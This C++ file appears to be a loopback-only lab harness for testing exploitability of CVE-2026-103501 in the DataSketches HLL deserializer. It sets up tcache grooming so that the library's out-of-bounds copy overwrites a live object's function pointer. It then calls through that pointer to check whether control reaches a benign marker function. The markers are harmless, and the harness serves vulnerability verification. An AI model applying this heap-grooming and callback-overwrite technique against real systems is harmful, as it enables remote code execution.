// Loopback-only consumer for CVE-2026-103501 with consumer-side tcache grooming.
// Question: does the library's own OOB copy at pinned CouponList-internal.hpp:116
// overwrite a LIVE object's function pointer placed just above the coupon
// vector, and can an indirect call through that field reach a benign marker?
//
// Conditions disclosed: lab-only synthetic consumer, -no-pie so marker
// addresses are stable, grooming done by the consumer before deserialize,
// 127.0.0.1 only. No library source is copied, patched or shimmed.

#include "hll.hpp"

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <exception>
#include <vector>

using namespace datasketches;

volatile uint64_t g_m2 = 0;
volatile uint64_t g_m3 = 0;

// Non-inlined, stable under -no-pie. Two DIFFERENT functions: the crafted
// pointer must reach marker3, not merely re-store the original marker2.
extern "C" void benign_marker2() {
  g_m2 = 0x2222222222222222ULL;
  std::printf("BENIGN_MARKER2_EXECUTED\n");
  std::fflush(stdout);
}
extern "C" void benign_marker3() {
  g_m3 = 0x3333333333333333ULL;
  std::printf("BENIGN_MARKER3_EXECUTED\n");
  std::fflush(stdout);
}

struct LiveVictim {
  uint64_t magic;
  void (*callback)();
  uint64_t refcount;
  char label[32];
  LiveVictim()
      : magic(0x43414348454e5452ULL), callback(&benign_marker2),
        refcount(0x1) {
    std::memset(label, 'C', sizeof(label));
  }
};

// Globals so the gdb leg can read the real layout at the pinned copy site.
void* g_G = nullptr;
LiveVictim* g_V = nullptr;

static bool read_exact(int fd, uint8_t* dst, size_t n) {
  size_t done = 0;
  while (done < n) {
    const ssize_t r = ::read(fd, dst + done, n - done);
    if (r == 0) return false;
    if (r < 0) { if (errno == EINTR) continue; return false; }
    done += static_cast<size_t>(r);
  }
  return true;
}

int main(int argc, char** argv) {
  const int port = argc > 1 ? std::atoi(argv[1]) : 38171;
  const int ls = ::socket(AF_INET, SOCK_STREAM, 0);
  if (ls < 0) { std::perror("socket"); return 2; }
  int one = 1;
  ::setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
  sockaddr_in addr;
  std::memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(static_cast<uint16_t>(port));
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);  // 127.0.0.1 only, always
  if (::bind(ls, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) < 0) {
    std::perror("bind"); return 2;
  }
  if (::listen(ls, 1) < 0) { std::perror("listen"); return 2; }
  std::printf("SERVICE_LISTEN port=%d pid=%d\n", port, static_cast<int>(::getpid()));
  std::fflush(stdout);

  const int cs = ::accept(ls, nullptr, nullptr);
  if (cs < 0) { std::perror("accept"); return 2; }
  uint8_t lenbuf[4];
  if (!read_exact(cs, lenbuf, 4)) return 2;
  uint32_t len = 0;
  std::memcpy(&len, lenbuf, 4);
  len = ntohl(len);
  std::printf("SERVICE_IMAGE bytes=%u\n", len);
  std::fflush(stdout);
  if (len == 0 || len > (1u << 20)) return 2;

  std::vector<uint8_t> buf(len);
  if (!read_exact(cs, buf.data(), len)) return 2;

  // Deterministic consumer-side layout, before deserialize:
  //   G: malloc(32) -> chunk 0x31, same size class as coupons_ (8 * uint32_t).
  //   V: new LiveVictim (56 B) -> chunk 0x41, physically just above G.
  //   free(G): tcache[0x30] = G. The coupon vector's malloc(32) reuses G,
  //            so V's chunk header is at coupon+40 and V's fields at +48.
  g_G = std::malloc(32);
  g_V = new LiveVictim();
  std::free(g_G);
  std::printf("GROOM_PRE G=%p V=%p CB2=%p CB3=%p\n",
              g_G, (void*) g_V,
              (void*) &benign_marker2, (void*) &benign_marker3);
  std::fflush(stdout);
  try {
    const auto sk = hll_sketch::deserialize(buf.data(), buf.size());
    (void) sk;  // destructor may see corrupted fields; call through V first
  } catch (const std::exception& e) {
    std::printf("SERVICE_DESERIALIZE rv=exception what=%s\n", e.what());
  }

  std::printf("AFTER_WRITE V_magic=%016llx V_cb=%p V_ref=%016llx\n",
              (unsigned long long) g_V->magic,
              (void*) g_V->callback,
              (unsigned long long) g_V->refcount);
  std::fflush(stdout);

  // Genuine indirect call through the field the library wrote. The original
  // holds benign_marker2; a successful overwrite holds benign_marker3.
  void (*cb)() = g_V->callback;
  cb();
  std::printf("CALL_THROUGH ptr=%p m2=%016llx m3=%016llx\n",
              (void*) cb,
              (unsigned long long) g_m2, (unsigned long long) g_m3);
  std::printf("SERVICE_EXIT\n");
  std::fflush(stdout);
  ::close(cs);
  ::close(ls);
  // Skip destructors: the 256-byte copy also reaches the sketch object above
  // V; the marker readback is the evidence, so exit before its destructor.
  _exit(0);
}
